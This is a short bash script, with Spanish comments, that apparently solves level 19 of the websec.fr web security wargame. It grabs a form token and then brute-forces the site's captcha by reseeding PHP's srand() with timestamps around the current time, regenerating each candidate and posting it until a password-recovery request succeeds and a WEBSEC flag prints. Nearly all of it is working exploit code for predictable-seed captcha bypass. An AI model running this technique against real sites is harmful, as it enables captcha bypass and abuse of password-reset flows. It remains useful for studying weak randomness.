#!/bin/bash

COOKIE_JAR="/tmp/cookies_wide.txt"
rm -f $COOKIE_JAR

curl -s -c $COOKIE_JAR "https://websec.fr/level19/index.php" > /tmp/page_wide.html
TOKEN=$(grep -oP 'value="\K[^"]+(?=">)' /tmp/page_wide.html | tail -1)

echo "Token: $TOKEN"

CURRENT=$(date +%s)
echo "Timestamp actual: $CURRENT"

# Probar desde 30 segundos atrás hasta 5 adelante
for ts in $(seq $((CURRENT - 30)) $((CURRENT + 5))); do
    captcha=$(php -r "
        srand($ts);
        \$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
        \$text = '';
        for(\$i = 0; \$i < 25; \$i++) {
            \$text .= \$chars[rand() % strlen(\$chars)];
        }
        echo \$text;
    ")
    
    result=$(curl -s -b $COOKIE_JAR "https://websec.fr/level19/index.php" \
        -d "captcha=$captcha&token=$TOKEN&submit=")
    
    if echo "$result" | grep -q "Password recovery email sent"; then
        echo "¡¡¡ÉXITO con timestamp $ts!!!"
        echo "$result" | grep -oP 'WEBSEC\{[^}]+\}' | head -1
        exit 0
    fi
    
    # Solo mostrar cada 5 intentos para no saturar
    if [ $((ts % 5)) -eq 0 ]; then
        echo "Probando $ts..."
    fi
done

echo "No se encontró el timestamp correcto"
